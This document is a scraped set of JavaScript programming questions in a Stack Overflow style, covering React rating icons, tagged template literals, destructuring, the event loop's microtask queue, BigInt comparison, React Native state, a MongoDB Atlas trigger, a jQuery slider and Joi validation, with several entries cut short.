Is it possible to only show have of a SVG icon?," I currently have a rating system that produces 5 stars that can show half values. I did this by using FontAwesome's Half Stars and did some CSS tricks to make them look like one star. But I was thinking of increasing my React and CSS knowledge by coming up with a way to show only half of an SVG icon. So instead of using the Half Stars, I could use whatever Icon the user wanted, and it would only show 50% of the Icon for example if you wanted to give a 3.5 rating.Q: Can you show only half of an Icon and somehow know if the user is clicking on one side or the other?Here is the code I have currently that uses the HalfStars for a little bit of reference <code>  import React, { useState } from 'react'import { FaRegStarHalf, FaStarHalf } from 'react-icons/fa'import './styles/Rater.css'const Rater = ({ iconCount }) => { const [rating, setRating] = useState(null) const [hover, setHover] = useState(null) // check if user has set a rating by clicking a star and use rating to determine icons const Star = rating ?

Template literals and pathentheses-less function calls," I recently learned that ES6 allows to make function calls without parentheses when using a template literal as a parameter. E.g. After reading a few articles on this functionality, however, I have come away with scant information as to the logic behind how JS handles these calls.After playing around with some permutations of my code, I am still struggling to piece together the pattern of how a template literal is broken down inside the function when one calls it that way. What happens in the above code is straightforward, the string literal is received as an array where the first and only element is the string.Where it gets a bit confusing is once I start using expressions inside the template. E.g. So it looks like the ...values part destructures all the expressions. But why, then, does the str array have empty strings in those spots?I just don't fully grasp the pattern it follows here. Can someone explain this feature? Or perhaps point me to a good article? <code>  showstring`Hello World`; const showstring = (str) => { console.log(str);}showstring`Hello World`; const showstring = (str, ...values) => { console.log(str); console.log(values)}const name = 'John'showstring`Hello World ${name} ${name} ${1 + 2} and more`;",Template literals and parentheses-less function calls

But for instance when I have a higher indice to destruct This would mean I have to write it like Question: Is there a better way to write Array Destructuring with skipping values in JavaScript? <code>  const splittedArr = [1, 2, 3, 4, 5]const result = splittedArr[1]; const splittedArr = [1, 2, 3, 4, 5]const [, result] = splittedArr; const splittedArr = [1, 2, 3, 4, 5]const result = splittedArr[1];const [, res] = splittedArr;console.log(result, res); const splittedArr = [1, 2, 3, 4, 5]const result = splittedArr[5]; const splittedArr = [1, 2, 3, 4, 5]const [,,,, result] = splittedArr; const splittedArr = [1, 2, 3, 4, 5]const result = splittedArr[4];const [, , , , res] = splittedArr;console.log(result, res);",Array Destructuring Skipping Values
What's the advantage of having a separate microtask queue (or job queue) which the event loop prioritises over the task queue (or callback queue)?," My understanding of how asynchronous tasks are scheduled in JSPlease do correct me if I'm wrong about anything:The JS runtime engine agents are driven by an event loop, which collects any user and other events, enqueuing tasks to handle each callback.The event loop runs continuously and has the following thought process:Is the execution context stack (commonly referred to as the call stack) empty?If it is, then insert any microtasks in the microtask queue (or job queue) into the call stack. Keep doing this until the microtask queue is empty.If microtask queue is empty, then insert the oldest task from the task queue (or callback queue) into the call stackSo there are two key differences b/w how tasks and microtasks are handled:Microtasks (e.g. promises use microtask queue to run their callbacks) are prioritised over tasks (e.g. callbacks from othe web APIs such as setTimeout)Additionally, all microtasks are completed before any other event handling or rendering or any other task takes place. Thus, the application environment is basically the same between microtasks.Promises were introduced in ES6 2015. I assume the microtask queue was also introduced in ES6.My questionWhat was the motivation for introducing the microtask queue? Why not just keep using the task queue for promises as well?Update #1 - I'm looking for a definite historical reason(s) for this change to the spec - i.e. what was the problem it was designed to solve, rather than an opinionated answer about the benefits of the microtask queue.References:In depth: Microtasks and the JavaScript runtime environmentHTML spec event loop processing modelJavascript-hard-parts-v2loupe - Visualisation tool to understand JavaScript's call stack/event loop/callback queue interactionUsing microtasks in JavaScript with queueMicrotask() <code> ",What was the motivation for introducing a separate microtask queue which the event loop prioritises over the task queue?
"NextJS + react-hook-mousetrap : ""Cannot use import statement outside a module"" - Dynamic imports of hooks?"," Trying out Next.js but I'm struggling with the following. Just tried to install react-hook-mousetrap and imported it like I normally would: This gives me the following error: I am not sure what this means?

React Native Flatlist search not returning any users from firebase on initial and following searches," so I recently tried to make a FlatList search for users in firebase, but I have been running into a bunch of errors, although there seems to be no bugs in the code. At the moment, the list searches and does not return anything, although there is clearly data in the firebase collection of ""users"". When I try to log ""results"" right above the resolve statement of the Promise in getUsers(), I all of a sudden see users, although I get the error that ""results"" does not exist, which is strange because why does the error make the code work? Anyways, If anyone would be able to help me in trying to make this FlatList work, I would greatly appreciate it. I have been working on this for 3 days now and can't seem to find any solution online or fix the code. For your help, I would gladly venmo you a dunkin donut, as this means a lot to me.

Why does x == BigInt(x) ... only sometimes?," I thought that JavaScript's loose equality operator was being nice and letting me compare Numbers with BigInts: So I tried a number bigger than Number.MAX_SAFE_INTEGER. I figured that since the number gets rounded up automatically, I might have to round up the BigInt as well for them to be considered equal: Great, makes sense so then I tried another big number that gets rounded up: I observed the same results in Chrome, Safari, and Node.js.Why isn't this behavior consistent? Is it because the numbers are compared as mathematical values, and what does that mean? <code>  42 == 42n // true! 9999999999999999 == 10000000000000000 // true - rounded to float649999999999999999 == 9999999999999999n // false - makes sense!10000000000000000 == 9999999999999999n // false - makes sense!9999999999999999 == 10000000000000000n // true - makes sense! 18446744073709551616 == 18446744073709552000 // true - rounded to float6418446744073709551616 == 18446744073709551616n // true?!18446744073709552000 == 18446744073709551616n // true?!18446744073709551616 == 18446744073709552000n // false?!","Why does Number(""x"") == BigInt(""x"") ... only sometimes?"

Lifting a state so I can modify it with a onPress," I am trying to figure out how lifting states work. Currently, I am trying to use onPress in a different component to change the state. In the snack demo I provided below, ListHome and MapHome do not respond for some reason, but you will still see what I am trying to accomplish.I want the map and list ""buttons"" to accomplish what the ""click for this"" does.Demo - No errors with the current implementation, just no response other than the flash from touchable opacity. (Also remember the snack does not respond for some reason. My local device works fine)EDIT: So to be clear, I want to be able to access and change the state whichComponentToShow from another component. i.e the ListHome Component.  <code>  export default class Home extends React.Component { constructor(props) { super(props); this.state = { visible: true, whichComponentToShow: 'Screen1', }; } goToMap = () => { this.setState({ whichComponentToShow: 'Screen2' }); }; render(){ if(this.state.whichComponentToShow === 'Screen1'){ return( <View style={{backgroundColor: '#d1cfcf' ,flex: 1}}> <ListHome renderMap = {this.goToMap.bind(this)} /> }} export default class ListHome extends React.Component { goToMap = () => { this.props.renderMap();}<TouchableOpacity onPress={() => this.goToMap.bind(this)}> <View style={styles.conditionalMap}> <View style={{justifyContent: 'center', alignItems: 'center'}}> <Text style={{color: 'black', fontSize: scale(15)}}> Map </Text> </View> </View></TouchableOpacity> import { StatusBar } from 'expo-status-bar';import React from 'react';import { StyleSheet, Text, View } from 'react-native';import { NavigationContainer } from '@react-navigation/native';import { createStackNavigator } from '@react-navigation/stack';import { createBottomTabNavigator } from '@react-navigation/bottom-tabs';import { MaterialCommunityIcons } from '@expo/vector-icons';import VenueDetailsScreen from './screens/VenueDetails';import CarouselGallary from './screens/Carousel';import Home from './screens/Home';import Friends from './screens/Friends';import Profile from './screens/Profile';const Tab = createBottomTabNavigator();function MyTabs() { return ( <Stack.Navigator initialRouteName=""Home""> <Stack.Screen name=""Home"" component={Home} options={{ headerShown: false }} /> <Stack.Screen name=""VenueDetails"" component={VenueDetailsScreen} options={{ headerShown: false }} /> <Stack.Screen name=""CarouselGallary"" component={CarouselGallary} options={{ headerShown: false }} /> <Stack.Screen name=""Friends"" component={Friends} options={{ headerShown: false }} /> <Stack.Screen name=""Profile"" component={Profile} options={{ headerShown: false }} /> </Stack.Navigator> );}export default function App() { return ( <NavigationContainer> <Tab.Navigator initialRouteName=""Home"" screenOptions={{ tabBarActiveTintColor: '#F60081', tabBarInactiveTintColor: '#4d4d4d', tabBarStyle: { backgroundColor: '#d1cfcf', borderTopColor: 'transparent', }, }}> <Tab.Screen name=""Home"" component={MyTabs} options={{ tabBarLabel: 'Home', headerShown: false, tabBarIcon: ({ color, size }) => ( <MaterialCommunityIcons name=""home"" color={color} size={size} /> ), }} /> <Tab.Screen name=""Friends"" component={Friends} options={{ tabBarLabel: 'Friends', tabBarIcon: ({ color, size }) => ( <MaterialCommunityIcons name=""account-group"" color={color} size={size} /> ), }} /> <Tab.Screen name=""Profile"" component={Profile} options={{ tabBarLabel: 'Profile', tabBarIcon: ({ color, size }) => ( <MaterialCommunityIcons name=""account"" color={color} size={size} /> ), }} /> </Tab.Navigator> </NavigationContainer> );}const Stack = createStackNavigator();",Lifting a state so I can modify it with an onPress
Cant read data from collection in MongoDB Trigger," New to MongoDB, very new to Atlas. I'm trying to set up a trigger such that it reads all the data from a collection named Config. This is my attempt: the function is part of an automatically created realm application called Triggers_RealmApp, which has Cluster0 as a named linked data source. When I go into Collections in Cluster0, TestDB.Config is one of the collections.Some notes:it's not throwing an error, but simply returning {}.When I change context.services.get(""Cluster0""); to something else, it throws an errorWhen I change ""TestDB"" to a db that doesnt exist, or ""Config"" to a collection which doesn't exist, I get the same output; {}I've tried creating new Realm apps, manually creating services, creating new databases and new collections, etc. I keep bumping into the same issue.The mongo docs reference promises and awaits, which I haven't seen in any examples (link). I tried experimenting with that a bit and got nowhere. From what I can tell, what I've already done is the typical way of doing it.Images:Collection:Linked Data Source: <code>  exports = function(changeEvent) { const mongodb = context.services.get(""Cluster0""); const db = mongodb.db(""TestDB""); var collection = db.collection(""Config""); config_docs = collection.find().toArray(); console.log(JSON.stringify(config_docs));}",Cant read data from collection in MongoDB Atlas Trigger
How to add multiple slider support to simple jquery slider?," I have a very simple slider with jquery; it supports only one slider, and I want to make it support multiple sliders on the same page.Example: Slider 1, Slider 2, Slider 3 etc. on the same page.A working snippet is here working example.I know I have to use each functionand I didbut it stopped working. I don't know where I am going wrong. This is what I tried; the code was too long, so I shortened it: Here is my complete code: I don't want to repeat the same code for each slider.I want it to support multiple sliders like this example; that example uses each function to get all the sliders, but it doesn't have mouseenter and mouseleave and indicators in it. <code>  $('#slider').each(function() { var current_slider = $(this); //slider codes in here }); $(function(){ var Slider = 0;$.Slider = function(total){ $(""#indicator li"").removeClass(""active""); $(""#image li"").hide(); if (Slider < total -1){ Slider++; $(""#indicator li:eq(""+Slider+"")"").addClass(""active""); $(""#image li:eq(""+Slider+"")"").fadeIn(""slow""); }else { $(""#indicator li:first"").addClass(""active""); $(""#image li:first"").fadeIn(""slow""); Slider = 0; } } var totalLi = $(""#indicator li"").length; var interval = setInterval('$.Slider('+totalLi+')',5000); $(""#slider"").hover(function(){ clearInterval(interval); },function(){ interval = setInterval('$.Slider('+totalLi+')',5000); }); $(""#indicator li:first"").addClass(""active""); $(""#image li"").hide(); $(""#image li:first"").show(); $(""#indicator li"").hover(function(){ var indicators = $(this).index(); $(""#indicator li"").removeClass(""active""); $(this).addClass(""active""); $(""#image li"").hide(); $(""#image li:eq(""+indicators+"")"").fadeIn(""slow""); Slider = indicators; return true; }); });",How to add multiple slider support to a simple jquery slider?
why -0 is lesser than 0?," I know (-0 === 0) comes out to be true. I am curious to know why -0 < 0 happens?When I run this code in stackoverflow execution context, it returns 0. But when I run the same code in the browser console, it returns -0. Why is that? I have tried to search it on google but didn't find anything useful. This question might not add value to someone practical example, I wanted to understand how does JS calculates it. <code>  const arr = [+0, 0, -0];console.log(Math.min(...arr)); const arr = [+0, 0, -0]; console.log(Math.min(...arr)); // -0","Why does Math.min() return -0 from [+0, 0, -0]"
How to chain functions asynchronously using javascript?," I was asked to create such an object called foo that can chain the function log and wait.For example: In this scenario it prints breakfast first, waits 3 seconds, prints lunch, and then after 3 seconds it prints dinner.I tried something like this, but it doesn't work.

How can I ensure that an array of objects contains only one of a particular key with Joe?, I have something like: I want to convert this to a Joi schema. How would I accomplish this?Thank you <code>  let moduleId moduleRackOutputs.forEach((output) => { if (!moduleId) { moduleId = output.moduleId } else if (output.moduleId !== moduleId) { errors.add([ 'The drawing contains more than one module type. Multiple module types are not yet supported by the PVsyst RPA.' ]) } }),How can I ensure that an array of objects contains only one of a particular key with Joi?
